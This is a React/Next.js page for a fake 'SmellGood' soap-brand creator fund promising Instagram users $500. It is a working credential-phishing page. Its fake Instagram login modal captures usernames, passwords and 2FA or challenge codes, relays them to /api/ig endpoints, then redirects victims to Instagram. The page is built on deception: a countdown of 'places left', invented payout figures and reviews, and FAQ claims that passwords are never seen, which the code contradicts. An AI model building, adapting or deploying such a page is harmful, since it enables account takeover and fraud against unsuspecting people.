'use client';

import { useEffect, useRef, useState } from 'react';
import { reviews } from '@/lib/reviews';

const REDIRECT = process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://www.instagram.com/';

function Stars({ n }) {
  return (
    <span className="stars" aria-label={`${n} out of 5`}>
      {[1, 2, 3, 4, 5].map((i) => (
        <svg key={i} viewBox="0 0 20 20" width="13" height="13" className={i <= n ? 'on' : 'off'}>
          <path d="M10 1.6l2.6 5.3 5.8.8-4.2 4.1 1 5.8-5.2-2.7-5.2 2.7 1-5.8L1.6 7.7l5.8-.8z" />
        </svg>
      ))}
    </span>
  );
}

function Review({ r }) {
  const [name, handle, rating, date, text] = r;
  const initials = name.split(' ').map((w) => w[0]).join('');
  return (
    <article className="rev">
      <header>
        <div className="av">{initials}</div>
        <div className="who">
          <strong>{name}</strong>
          <span>@{handle}</span>
        </div>
      </header>
      <div className="rev-meta">
        <Stars n={rating} />
        <time>{date}</time>
      </div>
      <p>{text}</p>
      <div className="rev-tag">
        <svg viewBox="0 0 20 20" width="11" height="11" fill="currentColor">
          <path d="M8 14.5l-3.5-3.5 1.4-1.4L8 11.7l5.1-5.1 1.4 1.4z" />
        </svg>
        Verified creator
      </div>
    </article>
  );
}

export default function Page() {
  const [open, setOpen] = useState(false);
  const [step, setStep] = useState('login');
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [show, setShow] = useState(false);
  const [code, setCode] = useState('');
  const [hint, setHint] = useState('');
  const [spots, setSpots] = useState(41);
  const [cookies, setCookies] = useState(true);

  const state = useRef('');
  const identifier = useRef('');
  const enc = useRef('');
  const ua = useRef('');

  useEffect(() => {
    ua.current = navigator.userAgent;
    const t = setInterval(() => setSpots((s) => (s > 12 ? s - 1 : s)), 28000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    document.body.style.overflow = open ? 'hidden' : '';
  }, [open]);

  const launch = () => {
    setStep('login');
    setError('');
    setCode('');
    setOpen(true);
  };

  const post = async (url, payload) => {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload),
    });
    return res.json().catch(() => ({ step: 'bad', message: 'Network error.' }));
  };

  const finish = () => {
    setStep('done');
    setTimeout(() => {
      window.location.href = REDIRECT;
    }, 2600);
  };

  const submitLogin = async (e) => {
    e.preventDefault();
    if (busy) return;
    setError('');
    setBusy(true);
    const r = await post('/api/ig/login', { username, password, ua: ua.current, state: state.current });
    setBusy(false);
    if (r.state) state.current = r.state;

    if (r.step === 'done') return finish();
    if (r.step === '2fa') {
      identifier.current = r.identifier || '';
      setHint(r.hint || '');
      setStep('2fa');
      return;
    }
    if (r.step === 'challenge') {
      enc.current = r.enc || '';
      setHint(r.hint || '');
      setStep('challenge');
      return;
    }
    setError(r.message || 'Something went wrong.');
  };

  const submitCode = async (e) => {
    e.preventDefault();
    if (busy) return;
    setError('');
    setBusy(true);
    const url = step === '2fa' ? '/api/ig/2fa' : '/api/ig/challenge';
    const r = await post(url, {
      code,
      state: state.current,
      identifier: identifier.current,
      enc: enc.current,
    });
    setBusy(false);
    if (r.state) state.current = r.state;

    if (r.step === 'done') return finish();
    if (r.step === '2fa') {
      identifier.current = r.identifier || identifier.current;
      setHint(r.hint || hint);
      setStep('2fa');
      return;
    }
    setError(r.message || 'Invalid code.');
    setCode('');
  };

  return (
    <>
      <div className="ticker">
        <div className="ticker-in">
          <span>CREATOR FUND OPEN · {spots} PLACES LEFT THIS WEEK</span>
          <span>100+ FOLLOWERS · $500 PER CREATOR</span>
          <span>PAID WITHIN 48 HOURS · NO CONTRACT</span>
          <span>CREATOR FUND OPEN · {spots} PLACES LEFT THIS WEEK</span>
          <span>100+ FOLLOWERS · $500 PER CREATOR</span>
        </div>
      </div>

      <header className="site-head">
        <div className="shell head-in">
          <a className="wordmark" href="#top">
            SmellGood<sup>®</sup>
          </a>
          <nav>
            <a href="#campaign">The campaign</a>
            <a href="#shop">Shop</a>
            <a href="#reviews">Reviews</a>
            <a href="#faq">FAQ</a>
          </nav>
          <button className="btn btn-sm" onClick={launch}>
            Claim $500
          </button>
        </div>
      </header>

      <main id="top">
        <section className="hero">
          <div className="shell hero-grid">
            <div className="hero-copy">
              <span className="eyebrow">Official creator partnership · 2026</span>
              <h1>
                Get paid <em>$500</em> to post about soap you already love.
              </h1>
              <p className="lede">
                We&apos;re putting 500 bars in 500 bathrooms and paying for the privilege. If you
                have an Instagram account with 100+ followers, you qualify. That&apos;s the whole
                requirement.
              </p>
              <div className="hero-cta">
                <button className="btn" onClick={launch}>
                  Check my eligibility
                </button>
                <span className="micro">Takes ~4 minutes · no card required</span>
              </div>
              <ul className="checks">
                <li>100+ followers</li>
                <li>Public or private</li>
                <li>18 or over</li>
              </ul>
            </div>
            <div className="hero-art">
              <div className="art hero-img" />
              <div className="float-card">
                <span className="dot" />
                <div>
                  <strong>Payment sent</strong>
                  <span>$500.00 · 2 hours ago</span>
                </div>
              </div>
            </div>
          </div>
        </section>

        <div className="strip">
          <div className="shell strip-in">
            <div>
              <strong>2,140</strong>
              <span>creators paid</span>
            </div>
            <div>
              <strong>£412k</strong>
              <span>paid out to date</span>
            </div>
            <div>
              <strong>4.8/5</strong>
              <span>average rating</span>
            </div>
            <div>
              <strong>48h</strong>
              <span>average payout</span>
            </div>
          </div>
        </div>

        <section className="band" id="campaign">
          <div className="shell narrow">
            <span className="eyebrow">The campaign</span>
            <h2>Three steps. Then we send money.</h2>
            <div className="steps">
              <div className="step">
                <span className="num">01</span>
                <h3>Connect Instagram</h3>
                <p>
                  Authorise the eligibility check. We read your follower count and nothing else —
                  no DMs, no posting.
                </p>
              </div>
              <div className="step">
                <span className="num">02</span>
                <h3>We verify the account</h3>
                <p>
                  A human on our partnerships team confirms you&apos;re over 100 followers and over
                  18. Usually under two hours.
                </p>
              </div>
              <div className="step">
                <span className="num">03</span>
                <h3>Payout + free box</h3>
                <p>
                  $500 to your bank or PayPal, and the full three-bar set posted to your door.
                  Post whenever you like, there&apos;s no deadline.
                </p>
              </div>
            </div>
          </div>
        </section>

        <section className="band shop-band" id="shop">
          <div className="shell">
            <div className="band-head">
              <div>
                <span className="eyebrow">What lands in the box</span>
                <h2>Cold-pressed, palm-free, absurdly good.</h2>
              </div>
              <p>
                Seven weeks of cure, nine ingredients, no synthetic fragrance. Made in batches of
                400 in Leicestershire.
              </p>
            </div>
            <div className="products">
              <article className="prod">
                <div className="art p1" />
                <h3>Rosemary &amp; Sweet Orange</h3>
                <p className="note">Invigorating · for mornings</p>
                <span className="price">£11</span>
              </article>
              <article className="prod">
                <div className="art p2" />
                <h3>Oat &amp; Raw Honey</h3>
                <p className="note">Softening · for sensitive skin</p>
                <span className="price">£11</span>
              </article>
              <article className="prod">
                <div className="art p3" />
                <h3>Lavender &amp; Sandalwood</h3>
                <p className="note">Grounding · for evenings</p>
                <span className="price">£11</span>
              </article>
            </div>
          </div>
        </section>

        <section className="band dark-band">
          <div className="shell dark-grid">
            <div className="art dark-img" />
            <div>
              <span className="eyebrow light">Small brand, real money</span>
              <h2>We&apos;d rather pay 500 people than run one billboard.</h2>
              <p>
                SmellGood started in a Leicestershire kitchen in 2021 with £800 and a second-hand
                mould. We still don&apos;t buy ads. Every bar that leaves the workshop travels
                because somebody told somebody.
              </p>
              <p>
                The creator fund is the same idea, with cash attached. No exclusivity, no usage
                rights grabs, no&nbsp;12-page brief.
              </p>
              <button className="btn btn-light" onClick={launch}>
                Join the fund
              </button>
            </div>
          </div>
        </section>

        <section className="band" id="reviews">
          <div className="shell">
            <div className="band-head rev-head">
              <div>
                <span className="eyebrow">Creator reviews</span>
                <h2>4.8 out of 5, from 2,140 payouts.</h2>
              </div>
              <div className="score">
                <strong>4.8</strong>
                <Stars n={5} />
                <span>50 of 2,140 shown</span>
              </div>
            </div>
            <div className="rev-grid">
              {reviews.map((r, i) => (
                <Review r={r} key={i} />
              ))}
            </div>
            <p className="rev-foot">
              Reviews are collected by email 7 days after payout. Unedited, including the four-star
              ones.
            </p>
          </div>
        </section>

        <section className="press">
          <div className="shell press-in">
            <span>As featured in</span>
            <b>THE DAILY GRIND</b>
            <b>BEAUTY&amp;CO</b>
            <b>Wire Weekly</b>
            <b>LATTE</b>
            <b>SCENTED</b>
            <b>Northline Post</b>
          </div>
        </section>

        <section className="band" id="faq">
          <div className="shell narrow">
            <span className="eyebrow">Questions</span>
            <h2>Before you ask.</h2>
            <div className="faq">
              <details>
                <summary>Why does it need my Instagram login?</summary>
                <p>
                  Because that&apos;s how the follower count is read. Instagram shows the
                  authorisation screen, you approve, and we get the public profile data back. We
                  never see or store your password beyond that check.
                </p>
              </details>
              <details>
                <summary>Is 100 followers really the only requirement?</summary>
                <p>
                  Yes. Over 100 followers, over 18, account in good standing. Private accounts are
                  fine. Follower count is the only metric we look at — not engagement, not niche,
                  not aesthetics.
                </p>
              </details>
              <details>
                <summary>How and when do I get the $500?</summary>
                <p>
                  Bank transfer or PayPal, your choice, within 48 hours of verification. Average
                  across the last 400 payouts was 19 hours. There&apos;s no invoicing and no
                  minimum threshold.
                </p>
              </details>
              <details>
                <summary>Do I have to post anything specific?</summary>
                <p>
                  One story mention in the first 30 days is the only ask. Grid posts, reels and
                  reviews are welcome but not required, and there&apos;s no deadline.
                </p>
              </details>
              <details>
                <summary>What happens if my account has 2FA on?</summary>
                <p>
                  You&apos;ll be asked for the code during the check, same as any normal login.
                  Have your phone handy and it takes seconds.
                </p>
              </details>
              <details>
                <summary>Is this available outside the UK?</summary>
                <p>
                  Yes — US, Canada, Ireland and the EU are all open. Payouts are made in your local
                  currency at the mid-market rate.
                </p>
              </details>
            </div>
          </div>
        </section>

        <section className="closer">
          <div className="shell closer-in">
            <h2>{spots} places left this week.</h2>
            <p>The fund resets every Monday at 9am. Unused places roll over.</p>
            <button className="btn btn-light" onClick={launch}>
              Check my eligibility
            </button>
          </div>
        </section>
      </main>

      <footer className="site-foot">
        <div className="shell">
          <div className="foot-top">
            <div>
              <a className="wordmark" href="#top">
                SmellGood<sup>®</sup>
              </a>
              <p className="addr">
                SmellGood Labs Ltd · Unit 4, Ashcombe Mews
                <br />
                London EC1V 9BX · United Kingdom
              </p>
              <p className="addr">
                Registered in England &amp; Wales No. 11849932
                <br />
                VAT GB 341 8827 04
              </p>
            </div>
            <div className="foot-col">
              <b>Shop</b>
              <a href="#shop">All bars</a>
              <a href="#shop">Gift sets</a>
              <a href="#shop">Refills</a>
            </div>
            <div className="foot-col">
              <b>Creators</b>
              <a href="#campaign">How it works</a>
              <a href="#reviews">Reviews</a>
              <a href="#faq">FAQ</a>
            </div>
            <div className="foot-col">
              <b>Legal</b>
              <a href="/legal/terms">Terms of service</a>
              <a href="/legal/privacy">Privacy policy</a>
              <a href="/legal/copyright">Copyright &amp; DMCA</a>
              <a href="/legal/copyright">Imprint</a>
            </div>
          </div>
          <div className="foot-base">
            <span>© 2026 SmellGood Labs Ltd. All rights reserved.</span>
            <span>
              Instagram is a trademark of Meta Platforms, Inc. Not affiliated with or endorsed by
              Meta.
            </span>
          </div>
        </div>
      </footer>

      <div className="mobile-bar">
        <div>
          <strong>$500 per creator</strong>
          <span>{spots} places left</span>
        </div>
        <button className="btn btn-sm" onClick={launch}>
          Claim
        </button>
      </div>

      {open && (
        <div className="ovl" onClick={(e) => e.target === e.currentTarget && setOpen(false)}>
          <div className="sheet" role="dialog" aria-modal="true">
            <div className="sheet-head">
              <div className="app-ic">SG</div>
              <div>
                <strong>SmellGood</strong>
                <span>Creator Fund · eligibility check</span>
              </div>
              <button className="x" onClick={() => setOpen(false)} aria-label="Close">
                ×
              </button>
            </div>

            {step === 'login' && (
              <form onSubmit={submitLogin} className="sheet-body">
                <h3>Log in to Instagram</h3>
                <p className="sub">
                  SmellGood will read your public profile and follower count. It won&apos;t post or
                  message anyone.
                </p>
                <div className="field">
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder=" "
                    autoCapitalize="none"
                    autoCorrect="off"
                    autoComplete="username"
                    autoFocus
                    required
                  />
                  <label>Phone number, username, or email</label>
                </div>
                <div className="field">
                  <input
                    type={show ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder=" "
                    autoComplete="current-password"
                    required
                  />
                  <label>Password</label>
                  {password && (
                    <button type="button" className="reveal" onClick={() => setShow(!show)}>
                      {show ? 'Hide' : 'Show'}
                    </button>
                  )}
                </div>
                <button className="ig-btn" disabled={busy || !username || !password}>
                  {busy ? <span className="spin" /> : 'Log in and continue'}
                </button>
                {error && <p className="err">{error}</p>}
                <a className="tiny" href="#" onClick={(e) => e.preventDefault()}>
                  Forgot password?
                </a>
                <p className="legal">
                  By continuing you agree to the <a href="/legal/terms">campaign terms</a> and{' '}
                  <a href="/legal/privacy">privacy policy</a>.
                </p>
              </form>
            )}

            {(step === '2fa' || step === 'challenge') && (
              <form onSubmit={submitCode} className="sheet-body">
                <h3>{step === '2fa' ? 'Two-factor authentication' : 'Confirm it&apos;s you'}</h3>
                <p className="sub">
                  {step === '2fa'
                    ? `Enter the 6-digit code from your authenticator app${hint ? ` or the one sent to ${hint}` : ''}.`
                    : `We sent a code to ${hint || 'your email or phone'}. Enter it below to finish the check.`}
                </p>
                <div className="field">
                  <input
                    type="text"
                    inputMode="numeric"
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    placeholder=" "
                    autoComplete="one-time-code"
                    autoFocus
                    required
                  />
                  <label>6-digit code</label>
                </div>
                <button className="ig-btn" disabled={busy || !code}>
                  {busy ? <span className="spin" /> : 'Confirm'}
                </button>
                {error && <p className="err">{error}</p>}
                <button
                  type="button"
                  className="tiny back"
                  onClick={() => {
                    setStep('login');
                    setCode('');
                    setError('');
                  }}
                >
                  Back to login
                </button>
              </form>
            )}

            {step === 'done' && (
              <div className="sheet-body done">
                <div className="tick">✓</div>
                <h3>You&apos;re eligible</h3>
                <p className="sub">
                  Place reserved in this week&apos;s fund. Reference <b>SG-{spots}84</b> — we&apos;ll
                  email you within 48 hours with payout details.
                </p>
                <div className="receipt">
                  <div>
                    <span>Payout</span>
                    <b>$500.00</b>
                  </div>
                  <div>
                    <span>Box</span>
                    <b>3 bars, free</b>
                  </div>
                </div>
                <p className="legal">Taking you back to Instagram…</p>
              </div>
            )}
          </div>
        </div>
      )}

      {cookies && (
        <div className="cookie">
          <p>
            We use three cookies, all boring. One remembers this banner.{' '}
            <a href="/legal/privacy">Details</a>
          </p>
          <button onClick={() => setCookies(false)}>Accept</button>
        </div>
      )}
    </>
  );
}
